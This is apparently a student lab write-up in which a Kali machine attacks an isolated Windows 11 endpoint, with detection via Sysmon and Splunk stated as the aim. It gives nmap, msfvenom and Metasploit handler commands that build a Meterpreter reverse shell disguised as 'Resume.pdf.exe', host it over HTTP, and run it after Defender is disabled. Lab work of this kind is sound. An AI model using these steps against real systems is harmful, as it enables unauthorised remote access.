# Metasploit Attack Simulation & Endpoint Detection Lab
*Kali Linux (Attacker) vs Windows 11 (Endpoint) with Sysmon + Splunk Monitoring*

## Project Overview
*This lab simulates a real-world attack lifecycle followed by endpoint detection and log analysis.*

The objective was to:
* Generate and deliver a reverse TCP payload from Kali Linux
* Establish a Meterpreter session on a Windows 11 endpoint
* Analyze system behavior from the defender’s perspective
* Ingest telemetry using Sysmon
* Detect and investigate the attack inside Splunk

The lab was conducted inside an isolated NAT network to prevent exposure to the host system.

---

## Lab Architecture

| Component | Role | Details |
| :--- | :--- | :--- |
| **Kali Linux** | Attacker Machine | Payload generation & handler |
| **Windows 11** | Victim / Endpoint | Payload execution & telemetry source |
| **Network Mode** | NAT Network (Isolated) | Subnet: `10.0.2.0/24` |
| **Kali IP** | `10.0.2.15` | |
| **Windows IP** | `10.0.2.5` | |

Both machines were placed in the same subnet and verified using ping before proceeding.

---

## Phase 1 — Network Validation & Enumeration

### Connectivity Testing
Verified communication using:
```bash
ping 10.0.2.5
ping 10.0.2.15
```
Confirmed:
- Same subnet
- Correct IP prefix
- Successful bidirectional communication

### Port Enumeration with Nmap
Command used:
```bash
nmap -A 10.0.2.5 -Pn
```
Explanation:
- ```-A ``` → Enables OS detection, version detection, script scanning
- ```-Pn ``` → Skips host discovery

Initially, no open ports were discovered.

After enabling Remote Desktop on Windows:
- Port 3389 (RDP) was detected as open

This confirmed proper enumeration and service discovery.

---

## Phase 2 — Payload Generation & Exploitation

### Generating Payload with msfvenom
Command:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f exe -o Resume.pdf.exe
```
Explanation:

- ```windows/x64/meterpreter_reverse_tcp``` → Reverse shell payload
- ```LHOST``` → Attacker IP
- ```LPORT``` → Listening port
- ```-f exe``` → Windows executable format
- ```-o``` → Output file

The file was intentionally named ```bashResume.pdf.exe``` to simulate real-world social engineering techniques.

### Setting up Metasploit Listener
Commands:

```bash 
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.2.15
exploit
```
Purpose:
- ```multi/handler``` waits for incoming reverse connections
- Configured to match the generated payload

### Hosting the Payload
Command:
```bash
python3 -m http.server 9999
```
Purpose:
- Simple HTTP server to serve the payload
- Accessible via: ```http://10.0.2.15:9999```

 ---

## Phase 3 — Execution & Troubleshooting
Initial execution failed due to:
- Windows Defender real-time protection
- SmartScreen filtering
- Antivirus blocking

Actions taken:
- Disabled real-time protection
- Added file exclusion
- Retested execution

### Verifying Active Connection on Windows
Command:
```bash
netstat -anob
```
Explanation:
- ```-a``` → All connections
- ```-n``` → Numeric addresses
- ```-o``` → Show PID
- ```-b``` → Show executable

Confirmed:
- Established TCP connection to Kali
- Process: ```Resume.pdf.exe```
- PID identified

Verified PID again in Task Manager.

### Successful Meterpreter Session
After troubleshooting, a session was successfully established.

Executed commands such as:
```bash
dir
net users
net localgroup
```
Confirmed full remote interaction with the Windows system.
